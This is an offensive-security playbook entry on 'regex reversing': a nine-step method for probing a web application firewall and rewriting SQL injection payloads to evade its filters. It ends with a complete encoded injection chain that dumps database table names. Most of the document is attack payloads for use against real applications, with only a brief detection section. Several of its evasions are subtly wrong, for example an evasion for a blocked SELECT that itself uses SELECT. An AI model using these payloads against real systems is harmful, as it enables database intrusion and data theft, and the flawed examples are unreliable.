---
id: WAF-EVASION-02
title: Regex Reversing
category: Evasion Techniques
severity_range: Medium-Critical
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-02: Regex Reversing

## Summary

Regex reversing is a systematic, step-by-step methodology for defeating WAF regular expression filters. By observing which payloads are blocked and iteratively mutating the syntax, the attacker can reverse-engineer the WAF's filter rules and construct equivalent payloads that evade detection while retaining the same semantic meaning.

## When to Use

- When a WAF blocks common SQLi keywords but allows equivalent syntactic constructs
- During blind or black-box testing where error messages reveal filter rejections
- Against signature-based WAFs that rely on regex patterns rather than behavioral analysis
- When you have a feedback channel (block page, response difference) to infer filter rules

## Technique Details

The following 9-step walkthrough demonstrates the methodology against a progressively restrictive WAF filter on a SQL injection vector:

### Step 1: `and | or | union` Filtered

The WAF blocks `AND`, `OR`, and `UNION` keywords. Use SQLite/PostgreSQL concatenation and subquery operators.

```sql
-- Blocked:
1 AND 1=1
1 OR 1=1
UNION SELECT ...

-- Evasion:
1 || (select 1)
1 & 1
```

### Step 2: `where` Added

The WAF now also blocks the `WHERE` clause.

```sql
-- Blocked:
SELECT * FROM users WHERE id=1

-- Evasion:
SELECT * FROM users LIMIT 1
```

### Step 3: `limit` Added

The WAF blocks `LIMIT` as well.

```sql
-- Blocked:
SELECT * FROM users LIMIT 1

-- Evasion:
SELECT * FROM users GROUP BY id HAVING 1=1
```

### Step 4: `group by` Added

The WAF blocks `GROUP BY`.

```sql
-- Blocked:
SELECT * FROM users GROUP BY id HAVING 1=1

-- Evasion:
SELECT substr(group_concat(table_name),1,10) FROM information_schema.tables
```

### Step 5: `select` Added

The WAF blocks the `SELECT` keyword.

```sql
-- Blocked:
SELECT substr(group_concat(table_name),1,10) FROM information_schema.tables

-- Evasion (write to file):
SELECT * FROM users INTO OUTFILE '/tmp/out.txt'

-- Evasion (conditional extraction):
substr(users,1,1)  -- if SELECT is allowed without FROM context
```

### Step 6: Single Quote `'` Added

The WAF blocks single quotes.

```sql
-- Blocked:
SELECT * FROM users WHERE name='admin'

-- Evasion (hex encoding):
SELECT * FROM users WHERE name=0x61646d696e

-- Evasion (unhex):
SELECT * FROM users WHERE name=unhex(61646d696e)
```

### Step 7: `hex` Added

The WAF blocks the `HEX()` function.

```sql
-- Blocked:
SELECT * FROM users WHERE name=0x61646d696e

-- Evasion (conv-based encoding):
SELECT * FROM users WHERE name=lower(conv(11,10,36))
-- conv(11,10,36) -> 'B', lower('B') -> 'b'
```

### Step 8: `substr` Added

The WAF blocks the `SUBSTR()` function.

```sql
-- Blocked:
SELECT substr(password,1,1) FROM users

-- Evasion (lpad):
SELECT lpad(user,7,1)  -- left-pads 'user' to length 7 with '1's
```

### Step 9: Whitespace Filtered

The WAF blocks whitespace characters.

```sql
-- Blocked:
SELECT * FROM users

-- Evasion (vertical tab as separator):
SELECT%0b*%0bFROM%0busers
-- %0b = vertical tab, accepted as whitespace by some parsers
```

## Payload Examples

```sql
-- Complete evasion chain example
1 || (select group_concat(table_name) from information_schema.tables where table_schema=database())

-- After regex reversing:
1 || (select lpad(group_concat(table_name),1,1) from information_schema.tables where table_schema=lower(conv(11,10,36)))

-- With whitespace bypass:
1%0b||%0b(select%0blpad(group_concat(table_name),1,1)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=lower(conv(11,10,36)))
```

## Detection & Bypass Notes

**Detection:**
- WAFs with regex-based inspection can detect progressive evasion attempts through anomaly scoring.
- Unusual operator combinations (`||`, `%0b`, `conv()`) are indicators of regex reversing.
- Behavioral WAFs that evaluate query structure rather than keywords will be harder to evade.

**Bypass:**
- Study database-specific syntax differences (MySQL vs PostgreSQL vs MSSQL) for alternative operators.
- Combine regex reversing with comment obfuscation and encoding for greater effect.
- For NoSQL databases, apply the same iterative methodology to document query operators.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://portswigger.net/web-security/sql-injection
- https://www.slideshare.net/raesene/bypassing-wafs-with-sql-injection
